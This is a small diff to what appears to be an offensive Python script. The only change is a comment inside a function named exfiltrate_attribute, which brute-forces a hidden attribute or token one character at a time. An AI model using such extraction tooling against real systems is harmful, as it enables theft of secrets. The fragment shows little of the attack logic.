@@ -44,7 +44,7 @@ def test_attribute(test_value):
 def exfiltrate_attribute():
     found_string = ""
     iteration = 1
-    characters = string.digits + string.ascii_uppercase + special  # Using only digits for brute-forcing
+    characters = string.digits + string.ascii_uppercase + special  # Using digits, uppercase letters, and token seperator for brute-forcing
     while True:
         found = False
         logger.info(f"[*] Starting iteration {iteration}: Current found string: '{found_string}'")
